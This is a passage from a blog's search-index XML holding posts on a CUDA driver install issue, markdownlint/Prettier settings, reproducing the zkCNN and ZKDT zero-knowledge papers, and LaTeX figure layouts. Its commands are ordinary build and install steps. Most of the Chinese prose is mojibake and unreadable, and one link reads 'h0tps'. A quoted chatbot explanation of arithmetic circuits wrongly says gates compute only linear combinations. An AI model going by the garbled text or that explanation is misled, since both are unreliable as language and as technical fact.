apt-get install cuda=11.3.1-1 cuda-drivers=510.47.03-1</span><br></pre></td></tr></table></figure><p>é—®é¢˜ï¼š<ahref="https://github.com/NVIDIA/nvidia-docker/issues/1287#issuecomment-715512118">nvidia-dockerissue</a></p><p>åœ¨ docker çŠ¶æ€ä¸‹ï¼Œä¸»æœºå®‰è£…äº† nividia é©±åŠ¨ï¼Œå¹¶æŠŠ<code>/usr/bin/nvidia-debugdump</code> ç­‰ mount åœ¨äº† dockerè™šæ‹Ÿé•œåƒä¸­ï¼Œå› æ­¤å½“ä½ å°è¯•å®‰è£…ä¸€ä¸ªæ–°çš„ nividiaé©±åŠ¨æ—¶,ä½ ä¸èƒ½å¤Ÿè¦†å†™ä¸»æœºçš„æ–‡ä»¶ï¼Œåˆ›å»ºé•œåƒä¸ä¸»æœºä¹‹é—´çš„é“¾æ¥ã€‚</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://blog.csdn.net/m0_62114628/article/details/123388758">Ubuntu18.04å®‰è£… cuda11.3_åŠªåŠ›<sub>è‡ªå¾‹</sub>å¼€å¿ƒçš„åšå®¢-CSDN åšå®¢_cuda11.3</a></li><li><ahref="https://gist.github.com/realyee/18485e1cff8525b923dce765a04072dd">Instructionsfor CUDA v11.3 and cuDNN 8.2 installation on Ubuntu 20.04 for PyTorch1.11</a></li><li><ahref="https://www.songbingjia.com/nginx/show-293686.html">æ•´ä¸ªè¿‡ç¨‹_MXNetGluonTS ä½¿ç”¨æŠ¥é”™ï¼šOSError: libnccl.so.2: cannot open shared object file:No such file or directory</a></li><li><ahref="https://haulyn5.cn/2020/10/15/NVIDIA-Driver-bug-201015/">NVIDIA-Driver-bug-201015| Haulyn5 çš„åšå®¢</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
            <tag> cuda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCode çš„ Markdownlint å’Œ Prettier å…¼å®¹</title>
      <link href="/blog/2022/05/21/misc/markdownlint_prettier/"/>
      <url>/blog/2022/05/21/misc/markdownlint_prettier/</url>
      
        <content type="html"><![CDATA[<h2 id="é—®é¢˜">é—®é¢˜</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220521155853.png"alt="20220521155853" /><figcaption aria-hidden="true">20220521155853</figcaption></figure><p>ä¸ºäº†å’Œå¤§å¤šæ•°é¡¹ç›®æºç çš„ 4 ä¸ªç©ºæ ¼çš„ç¼©è¿›å…¼å®¹ï¼Œä¸€èˆ¬å°† Prettierè®¾ç½®<code>prettier.tabWidth": 4</code>,è€Œ Markdownçš„æ— åºåˆ—è¡¨çš„<code>-</code>ä¾¿ä¼šè¢«å½“æˆå››ä¸ªç©ºæ ¼ç¼©è¿›ï¼Œå› æ­¤å‡ºç°æ³¢æµªçº¿æŠ¥é”™é—®é¢˜ã€‚</p><blockquote><p>è¿™ä¸ªé—®é¢˜å›°æ‰°äº†æˆ‘è®¸ä¹…ï¼Œæœ‰æ—¶å€™å¹²è„†ä¸ç®¡ï¼Œä»Šå¤©å¿ƒæƒ…ä¸å¥½ï¼Œä¸€å®šè¦è§£å†³å®ƒï¼Œæœäº†æœprettier æ€ä¹ˆä¿®æ”¹é…ç½®ï¼Œæœäº†æœ prettier markdownlintç»ˆäºæœåˆ°äº†ï¼ŒåŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼ï¼ï¼</p></blockquote><h2 id="è§£å†³">è§£å†³</h2><p>Markdownlint æå‡ºå¯¹ Markdownlint å¢åŠ å¦‚ä¸‹é…ç½®:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;markdownlint.config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;MD007&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;indent&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;MD030&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ul_single&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ul_multi&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>çœ‹ç€æ²¡æœ‰æ³¢æµªçº¿æé†’çš„ Markdown åšæ–‡ï¼Œä¸€ä¸ªå­—ï¼Œå°±æ˜¯çˆ½ï¼ï¼ï¼</p></blockquote><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://github.com/DavidAnson/markdownlint/blob/main/doc/Prettier.md?plain=1">markdownlint/Prettier.mdat main Â· DavidAnson/markdownlint</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zkCNN è®ºæ–‡é˜…è¯»ä¸å¤ç°</title>
      <link href="/blog/2022/05/20/academic/papers/zkcnn/"/>
      <url>/blog/2022/05/20/academic/papers/zkcnn/</url>
      
        <content type="html"><![CDATA[<h2 id="è®ºæ–‡åœ°å€">è®ºæ–‡åœ°å€</h2><p><ahref="https://dl.acm.org/doi/abs/10.1145/3460120.3485379">CCS21ï¼šzkCNN:Zero Knowledge Proofs for Convolutional Neural Network Predictions andAccuracy | Proceedings of the 2021 ACM SIGSAC Conference on Computer andCommunications Security</a></p><h2 id="è®ºæ–‡æ¦‚è¿°">è®ºæ–‡æ¦‚è¿°</h2><h2 id="ä»£ç å¤ç°">ä»£ç å¤ç°</h2><p>ç¯å¢ƒï¼šUbuntu 18.04 and 20.04</p><h3 id="zkcnn">zkCNN</h3><p><a href="https://github.com/TAMUCrypto/zkCNN">TAMUCrypto/zkCNN: AGKR-based zero-knowledge proof protocol for CNN model inference.</a>ä¸€èˆ¬ä½¿ç”¨äº† submodulesçš„ï¼Œä½¿ç”¨<code>git clone --recurse-submodules ä»“åº“åœ°å€</code>å³å¯ï¼Œä½†æ˜¯æœ¬æ–‡ä»“åº“è®¾ç½®æœ‰ç‚¹å°é—®é¢˜ã€‚</p><ol type="1"><li><p>ä¸‹è½½</p><p>ç”±äºè¯¥ä»“åº“ä½¿ç”¨äº† submoduleï¼Œä½†æ˜¯å…¶ç”±äºè¯¥ä»“åº“ .gitmodules ä½¿ç”¨ SSHåè®®æŒ‡å®šçš„ä»“åº“ä½ç½®ï¼Œä½†æˆ‘ä»¬æ˜¾ç„¶æ²¡æœ‰è¢«æˆæƒè¿‡ï¼Œå› æ­¤æ²¡æœ‰æƒé™ä¸‹è½½submodulesã€‚è§£å†³åŠæ³•ï¼š</p><ol type="1"><li><p>(æ¨è) å…ˆ git clone ä»“åº“ï¼Œç„¶åæŠŠ .gitmodules çš„é“¾æ¥æ”¹æˆ HTTPSçš„ï¼Œç„¶åé€’å½’åˆå§‹åŒ–å¹¶æ›´æ–° submodules æ¨èï¼šé€’å½’åˆå§‹åŒ–ï¼Œå¹¶æ›´æ–°:<code>git submodule update --init --recursive</code></p><blockquote><p>ä¸æ¨èï¼š<code>git submodule update</code>åªæ›´æ–°å­é¡¹ç›®ä»£ç ï¼Œåœ¨ä¸€äº›æ—§ç‰ˆæœ¬æ²¡æœ‰åˆå§‹åŒ–çš„ submodules ä¸ä¼šè¢«æ›´æ–°</p></blockquote><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TAMUCrypto/zkCNN.git</span><br><span class="line">git submodule update --init --recursive</span><br></pre></td></tr></table></figure></p></li><li><p>(å‡‘æ´») åªä½¿ç”¨ git cloneï¼Œç›´æ¥æ‰¾ submodulesçš„ä»“åº“é—¨ï¼Œè‡ªè¡Œä¸‹è½½åˆ°æŒ‡å®šçš„åµŒå¥—çš„ submodules æ–‡ä»¶å¤¹ä½ç½®</p></li></ol></li><li><p>å®‰è£…ç¼ºå°‘çš„ä¾èµ–</p><p>å®‰è£… GMP library</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libgmp3-dev</span><br></pre></td></tr></table></figure></p><p><code>cmake --version</code> æŸ¥çœ‹ç‰ˆæœ¬æ˜¯å¦æ»¡è¶³ cmake &gt;= 3.10ï¼Œæ»¡è¶³<code>gcc --version</code> æŸ¥çœ‹ gcc ç‰ˆæœ¬æ˜¯å¦æ”¯æŒ C++14</p><blockquote><p>according to GCC's Standards Support page--which shows full C++14support since GCC v5</p></blockquote></li><li><p>ç¼–è¯‘è¿è¡Œ</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd scripts</span><br><span class="line">chmod +777 ./*</span><br><span class="line">./demo_lenet.sh</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="è°ƒè¯•">è°ƒè¯•</h3><p>CMake + VSCode è°ƒè¯• é…ç½® CMake é€‰æ‹© zkCNN ä¸»ç›®å½•ä¸‹çš„ CMakeLists.txtå…ˆ build é…ç½® CMake:build Target ä¸ºæƒ³è¦è¿è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶demo_lenet_run</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://stackoverflow.com/questions/10168449/git-update-submodules-recursively">Gitupdate submodules recursively - Stack Overflow</a></li><li><ahref="https://askubuntu.com/questions/207724/how-to-install-the-latest-gmp-library-in-12-04">softwareinstallation - How to install the latest gmp library in 12.04? - AskUbuntu</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
            <tag> zkp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZKDT è®ºæ–‡é˜…è¯»ä¸å¤ç°</title>
      <link href="/blog/2022/05/20/academic/papers/zkdt/"/>
      <url>/blog/2022/05/20/academic/papers/zkdt/</url>
      
        <content type="html"><![CDATA[<p>åœ°å€ï¼š<ahref="h0tps://dl.acm.org/doi/10.1145/3372297.3417278">CCS20ï¼šZeroKnowledge Proofs for Decision Tree Predictions and Accuracy |Proceedings of the 2020 ACM SIGSAC Conference on Computer andCommunications Security</a></p><h1 id="zkdt">zkDT</h1><p>Zhang et al. å¼€åˆ›äº† zkmlçš„ç ”ç©¶ï¼Œä¸“æ³¨äºè§£å†³é»‘ç›’æœºå™¨å­¦ä¹ æ¨¡å‹çš„å‡†ç¡®åº¦éªŒè¯é—®é¢˜(éªŒè¯é˜¶æ®µçš„è¯æ˜)ã€‚zkDTå¯ä»¥å®ç°ï¼šæ¨¡å‹çš„éªŒè¯è€…åœ¨ä¸ reveal è‡ªå·±çš„å†³ç­–æ ‘æ¨¡å‹çš„æƒ…å†µä¸‹ï¼Œè¯´æœåˆ«äºº theprediction result is indeed made by his decision tree model on the givethe input data sample. é€šè¿‡æ‰©å±•ä¸€ä¸ªæµ‹è¯•æ•°æ®çš„è¯æ˜åˆ° 100ï¼Œ 1000ä¸ªæµ‹è¯•æ•°æ®ï¼Œé‚£æ ·å°±å¯ä»¥å®ç°å¯¹é»‘ç›’æœºå™¨å­¦ä¹ æ¨¡å‹çš„éªŒè¯é—®é¢˜äº†ã€‚</p><p>æœ¬æ–‡ä¸“æ³¨äº binary decision trees on classification,å¹¶å£°ç§°æ›´å¤æ‚çš„å†³ç­–æ ‘æ¨¡å‹å¯ä»¥é€šè¿‡å°‘é‡ä¿®æ”¹æ¥å®ç°.</p><h2 id="zkdt-construction">zkDT construction</h2><p>recall ä¸€ä¸‹ zero knowledge proof system çš„å››ä¸ªéƒ¨åˆ†ï¼šArithmetization,IOP interactive oracle proof, cryptographic commitment --&gt;areal-world proof system ï¼ˆa non-interactive proof with Fiat-Shamirtransformationï¼‰</p><p>zkDT é‡‡ç”¨ <a href="https://eprint.iacr.org/2018/828.pdf">Aurora:Transparent Succinct Arguments for R1CS</a> å®ç° Arithmetization, IOPinteractive oracle proof ä¸¤éƒ¨åˆ†ã€‚Aurora æå‡ºé’ˆå¯¹ R1CS ç®—æœ¯åŒ–è¿›è¡Œä¼˜åŒ–çš„Polynomail IOPï¼Œå®ç°æ›´å¿«çš„è¯æ˜æ—¶é—´ä¸æ›´å°çš„è¯æ˜å¤§å°ï¼Œå¹¶ä¸”ä¸éœ€è¦ trustedSetupã€‚åœ¨ cryptographic commitment æ–¹é¢ï¼ŒzkDT é€šè¿‡è®¾è®¡ authenticateddecision trees with hiding and binding properties ä½œä¸º commitment schemeæ¥å°† idealized IOP protocolï¼ˆwith Random Oracle Model) compile ä¸ºçœŸæ­£çš„zero knowledge argument with computational soundness.</p><p>æ³¨ï¼šPreliminary å†™çš„å¾ˆå¥½ï¼Œå¯ä»¥å€Ÿé‰´</p><p>binary decision trees çš„é¢„æµ‹è¿‡ç¨‹ä¸ºï¼šä¸æ–­ä¸éå¶å­èŠ‚ç‚¹çš„å¯¹åº”å±æ€§attribute çš„åˆ†ç±»é˜ˆå€¼ thresholdè¿›è¡Œæ¯”è¾ƒï¼Œä»è€Œåˆ†ç±»åˆ°å·¦å³èŠ‚ç‚¹ï¼Œç›´åˆ°å¶å­èŠ‚ç‚¹ï¼Œä¾¿æ˜¯é¢„æµ‹çš„ç±»åˆ«ã€‚</p><p>éå¶å­èŠ‚ç‚¹åŒ…æ‹¬: ç±»åˆ«ï¼Œç±»åˆ«å¯¹åº”çš„é˜ˆå€¼</p><h2 id="zkdt-ç®—æ³•æµç¨‹">zkDT ç®—æ³•æµç¨‹</h2><ol type="1"><li><p>Given security parameter <spanclass="math inline">\(1^{\lambda}\)</span>ï¼ŒSetup (Note: the height ofthe decision tree is a common knowledge for both prover andverifier)</p></li><li><p>make the commitment of a decision tree T with a random r</p></li><li><p>Open the commitment at point <spanclass="math inline">\(x\)</span>.</p><p>given a data point <span class="math inline">\(x1\)</span>ï¼Œ thedecision tree model predict the corresponding results <spanclass="math inline">\(y1\)</span>. With the (x1,y1) as public inputs andthe model parameter as witness, the prover will give the correspondingproof <span class="math inline">\(\pi\)</span>.</p></li><li><p>valid the prediction <span class="math inline">\(y1\)</span> isindeed the output of the exact decision model with the input <spanclass="math inline">\(x1\)</span>.</p></li></ol><p>Contributions:</p><ol start="0" type="1"><li>å¼€åˆ›äº† zk on ml çš„ç ”ç©¶,å®ç°å†³ç­–æ ‘éªŒè¯é˜¶æ®µçš„éªŒè¯ä»¥åŠå‡†ç¡®åº¦éªŒè¯ã€‚</li><li>è®¾è®¡äº† authenticated data structures scheme for the commitment ofdecision tree (with hiding property)</li><li>åˆ©ç”¨é€šç”¨é›¶çŸ¥è¯†è¯æ˜ç³»ç»Ÿ Aurora å®ç°å†³ç­–æ ‘çš„é¢„æµ‹é˜¶æ®µéªŒè¯,å°† predictionpath and the hashes of the siblings ä½œä¸º the witness.</li><li>å€ŸåŠ© permutation ä»¥åŠ characteristic polynomials æ¥è§£å†³ circuitmodel ä¸‹ zkp for decision treeéšæœºè®¿é—®å¼€é”€å¤§ï¼ˆè¯æ˜æ—¶é—´ï¼Œè¯æ˜å¤§å°ï¼‰çš„é—®é¢˜</li></ol><h2 id="authenticated-decision-trees-commitment">authenticated decisiontrees commitment</h2><p>æœ¬æ–‡æå‡ºç›´æ¥è¿ç”¨ merkle tree proof åœ¨æ‰€æœ‰å†³ç­–æ ‘èŠ‚ç‚¹ä¸Šï¼Œå¼€é”€æ˜¯O(hlogN) hashesã€‚ï¼ˆä¸æ‡‚ï¼Œmerkle tree ä¸æ˜¯ logN å—ï¼Ÿï¼‰ï¼Œäºæ˜¯æ ¹æ®ADS(Authenticated Data Structure)ï¼Œæå‡º authenticated decision trees(ADT) ,å®ƒå…·æœ‰ completenessï¼Œ computational soundness benefiting fromcollision resistance of the cryptographic hash functions, and hidingproperty benefiting the blinding factor(è‡´ç›²å› å­ï¼Œjust a secure randomnumber).</p><p>é¢˜å¤–è¯ï¼ŒAuthenticated Data Structure æ˜¯ä¸€å¤§ç±»ï¼Œmerkle treeæ˜¯å…¶ä¸­ä¸€ç§ã€‚Past work on ADSs has focused on particular data structures,æœ€æ—©è¢«æå‡ºçš„ä¾¿æ˜¯é’ˆå¯¹ä¸æ ‘ç»“æ„çš„ ADSï¼Œ ä¹Ÿå°±æ˜¯ merkle tree.</p><h2 id="proving-the-valid-of-prediction-with-zero-knowledge">proving thevalid of prediction with zero Knowledge</h2><p>prover ç›´æ¥æŠŠ ADT çš„ éªŒè¯ path ç»™åˆ° verifierï¼Œverifierå°±å¯ä»¥éªŒè¯ï¼Œä½†æ˜¯è¿™æ ·å°±æš´éœ²äº†ä¸€æ¡è·¯å¾„ä¸Šçš„å€¼ã€‚</p><p>è§£å†³åŠæ³•ï¼šç›´æ¥ç”¨é€šç”¨çš„ zkpï¼Œå°†é¢„æµ‹è·¯å¾„å’Œ sibling çš„ hashes è®¾ç½®æˆwitness ï¼ˆprivateï¼‰å³å¯ã€‚</p><blockquote><p>By applying generic zero knowledge proofs on this relationship, theprediction path and the hashes of the siblings remain confidential asthe witness, a</p></blockquote><h2id="zkp-for-decision-tree-åœ¨-circuit-model-ä¸‹å¼€é”€å¤§è¯æ˜æ—¶é—´å’Œè¯æ˜å¤§å°">zkpfor decision tree åœ¨ circuit model ä¸‹å¼€é”€å¤§ï¼ˆè¯æ˜æ—¶é—´å’Œè¯æ˜å¤§å°ï¼‰</h2><p>å¤§å¤šæ•°é€šç”¨ zkpåè®®éƒ½æ˜¯åŸºäºå°†è¿ç®—è¡¨ç¤ºä¸ºç®—æœ¯ç”µè·¯çš„ï¼Œå°†å†³ç­–æ ‘è¡¨ç¤ºä¸ºç®—æœ¯ç”µè·¯å¼€é”€å¾ˆå¤§ã€‚(èŠ‚ç‚¹é¢„æµ‹æ—¶ï¼Œæ ¹æ®èŠ‚ç‚¹åˆ†ç±»å±æ€§éšæœºaccess æ•°æ®ç‚¹çš„å¯¹åº”å±æ€§ï¼Œæ˜¯ classical random accessoperationï¼Œç®—æ•°ç”µè·¯å¯¹è¿™ç§æ“ä½œä¸å‹å¥½ï¼Ÿä¸æ‡‚)</p><p>é‡äº‹ä¸å†³ GPT:</p><blockquote><p>Classical random access operations are not friendly with arithmeticcircuits because they require the circuit to perform a large number ofmemory accesses, which can be computationally expensive . In anarithmetic circuit, each gate computes a linear combination of its inputwires, and the output of the circuit is a linear combination of theinput wires .</p><p>To perform a random access operation on an arithmetic circuit, onewould need to access a specific wire in the circuit, which would requiretraversing the circuit from the input wires to the desired wire . Thistraversal would involve performing a large number of linearcombinations, which can be computationally expensive To avoid thiscomputational overhead, researchers have developed alternative methodsfor performing random access operations on arithmetic circuits, such asthe use of permutation arguments and the use of interactive oracleproofs (IOPs)</p></blockquote><p>æœ¬æ–‡é‡‡ç”¨çš„ alternative methods ä»¿ä½›å°±æ˜¯ the use of permutationargumentsï¼Ÿå°† data sample çš„å±æ€§é¡ºåº premute è°ƒæ•´ä¸º prediction pathä¸ŠèŠ‚ç‚¹çš„å±æ€§ v.attr é¡ºåºï¼ŒäºŒè€…é¡ºåºä¸€è‡´ï¼Œä¾¿å¯ä¸€ä¸€å¯¹åº”ï¼Œä¸ç”¨ random accessæ“ä½œäº†ï¼Œä¾¿é™ä½äº† decision tree åœ¨ circuit model ä¸Šçš„å¼€é”€ã€‚</p><blockquote><p>the permutation <span class="math inline">\(\overline{a}\)</span> ofthe data sample a ordered by v.att of the nodes on the prediction pathas part of the witness With the help of the permutation <spanclass="math inline">\(\overline{a}\)</span> of the data sample a, thiscan be efficiently implemented using an arithmetic circuit.</p></blockquote><p>ä¸è¿‡ï¼Œåˆå¼•å…¥äº† permutation test çš„é—®é¢˜ï¼Œæ¯•ç«Ÿèƒ¡ä¹± permutationæ··è¿‡éªŒè¯ä¹Ÿä¸å¾—è¡Œ,ç„¶åæœ¬æ–‡é‡‡ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š</p><blockquote><p>The construction is inspired by the RAM-based zero knowledge proofsystems and we also apply the techniques of characteristic polynomialsproposed in [15, 43, 45] to check permutations.</p></blockquote><p>å› æ­¤ï¼ŒzkDT å¯¹ä¸€ä¸ªæ•°æ®ç‚¹çš„éªŒè¯åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†:</p><ol type="1"><li>validating the prediction algorithm of the decision tree,è¿™å°±æ˜¯éªŒè¯é¢„æµ‹é˜¶æ®µçš„æ‰§è¡Œï¼Œæ˜¯ä¸»è¦éƒ¨åˆ†</li><li>checking the permutation between a and <spanclass="math inline">\(\overline{a}\)</span>ï¼Œè¿™ä¸ªä¸ºäº†å‡å°å¼€é”€ï¼Œå¼•å…¥çš„permutation å¸¦æ¥çš„é¢å¤–éªŒè¯æ­¥éª¤ã€‚</li><li>checking the validity of the prediction path in the committeddecision treeï¼Œ è¿™ä¸ªæ˜¯ open ä¹‹å‰çš„ commitment çœ‹ prediction pathæ˜¯å¦è¢«ç¯¡æ”¹ã€‚</li></ol><p>æ­¥éª¤ 1 å’Œæ­¥éª¤ 3 æ˜¯ zkml çš„ä¸»è¦æ­¥éª¤ï¼Œæ­¥éª¤äºŒæ˜¯é¢å¤–æ­¥éª¤ã€‚</p><h2 id="zkdt-ä»£ç å¤ç°">zkDT ä»£ç å¤ç°</h2><p>ç¯å¢ƒï¼šUbuntu 18.04 and 20.04</p><p>åœ°å€ï¼š<ahref="https://github.com/TAMUCrypto/ZKDT_release">TAMUCrypto/ZKDT_release</a>ï¼Œç›´æ¥git clone å³å¯</p><ol type="1"><li><p>å®‰è£…ç¼ºå°‘çš„åŒ…ï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y libprocps-dev # libprocps</span><br><span class="line">sudo apt-get install libssl-dev # libcrypto</span><br><span class="line">sudo apt-get install pkg-config</span><br></pre></td></tr></table></figure></p><p>é’ˆå¯¹æŠ¥é”™ï¼š</p><blockquote><p>No Boost libraries were found. You may need to set BOOST_LIBRARYDIRto the directory containing Boost libraries or BOOST_ROOT to thelocation of Boost.</p></blockquote><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libboost-all-dev</span><br></pre></td></tr></table></figure></p></li><li><p>ç¼–è¯‘</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ZKDT</span><br><span class="line">mkdir build &amp;&amp; cd build &amp;&amp; cmake ..</span><br><span class="line">make</span><br></pre></td></tr></table></figure></p></li><li><p>è¿è¡Œ</p><p>åœ¨ build çš„ src æ–‡ä»¶å¤¹ä¸‹ç›´æ¥è¿è¡Œç¼–è¯‘ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶å³å¯ã€‚</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build/src/dt_batch</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li><ahref="http://www.pl-enthusiast.net/2014/06/11/authenticated-data-structures-generically/">AuthenticatedData Structures (Generically) - The PL Enthusiast</a></li><li><ahref="https://stackoverflow.com/questions/24173330/cmake-is-not-able-to-find-boost-libraries">c++- CMake is not able to find BOOST libraries - Stack Overflow</a></li><li><a href="https://gcc.gnu.org/projects/cxx-status.html#cxx14">C++Standards Support in GCC - GNU Project</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
            <tag> zkp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Latex å¤šå›¾è¡¨æ’ç‰ˆä»£ç </title>
      <link href="/blog/2022/05/20/misc/latex/latex_graph/"/>
      <url>/blog/2022/05/20/misc/latex/latex_graph/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ LaTeX ä¸­æ’å…¥å¤šä¸ªç©ºè¡Œçš„æ­£ç¡®åšæ³•æ˜¯ï¼š</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\vspace</span>*&#123;n<span class="keyword">\baselineskip</span>&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ n ä¸ºæƒ³ç©ºçš„è¡Œæ•°ã€‚</p><p>æ— åºåˆ—è¡¨</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;itemize&#125;<span class="keyword">\compresslist</span></span><br><span class="line">    <span class="keyword">\item</span> ease of use when formatting,</span><br><span class="line">    <span class="keyword">\item</span>  compliance to electronic requirements,</span><br><span class="line">    <span class="keyword">\item</span> and conformity of style.</span><br><span class="line"><span class="keyword">\end</span>&#123;itemize&#125;</span><br></pre></td></tr></table></figure><p>ä¸‰å›¾æ¨ªå‘å¹¶åˆ—è·¨æ ç‹¬ç«‹æ ‡é¢˜</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;figure*&#125;</span><br><span class="line">    <span class="keyword">\begin</span>&#123;minipage&#125;[t]&#123;0.34<span class="keyword">\linewidth</span>&#125;</span><br><span class="line">        <span class="keyword">\centering</span></span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=<span class="keyword">\textwidth</span>]&#123;pic/computation<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">        <span class="keyword">\caption</span>&#123;Jay&#125;</span><br><span class="line">        <span class="keyword">\label</span>&#123;fig:a<span class="built_in">_</span>computation<span class="built_in">_</span>cost&#125;</span><br><span class="line">    <span class="keyword">\end</span>&#123;minipage&#125;</span><br><span class="line">    <span class="keyword">\begin</span>&#123;minipage&#125;[t]&#123;0.34<span class="keyword">\linewidth</span>&#125;</span><br><span class="line">        <span class="keyword">\centering</span></span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=<span class="keyword">\textwidth</span>]&#123;pic/communication<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">        <span class="keyword">\caption</span>&#123;cost&#125;</span><br><span class="line">        <span class="keyword">\label</span>&#123;fig:b<span class="built_in">_</span>communication<span class="built_in">_</span>cost&#125;</span><br><span class="line">    <span class="keyword">\end</span>&#123;minipage&#125;</span><br><span class="line">    <span class="keyword">\begin</span>&#123;minipage&#125;[t]&#123;0.34<span class="keyword">\linewidth</span>&#125;</span><br><span class="line">        <span class="keyword">\centering</span></span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=<span class="keyword">\textwidth</span>]&#123;pic/computation<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">        <span class="keyword">\caption</span>&#123;cost&#125;</span><br><span class="line">        <span class="keyword">\label</span>&#123;fig:c<span class="built_in">_</span>computation<span class="built_in">_</span>cost&#125;</span><br><span class="line">    <span class="keyword">\end</span>&#123;minipage&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;figure*&#125;</span><br></pre></td></tr></table></figure><p>ä¸‰å›¾æ¨ªå‘å¹¶åˆ—è·¨æ å­æ ‡é¢˜</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;subfigure&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;figure*&#125;</span><br><span class="line">    <span class="keyword">\subfigure</span>[name1]&#123;</span><br><span class="line">        <span class="keyword">\centering</span>  <span class="comment">%å›¾ç‰‡å…¨å±€å±…ä¸­</span></span><br><span class="line">        <span class="keyword">\label</span>&#123;Fig.sub.1&#125;</span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=0.32<span class="keyword">\textwidth</span>]&#123;pic/computation<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    &#125;</span><br><span 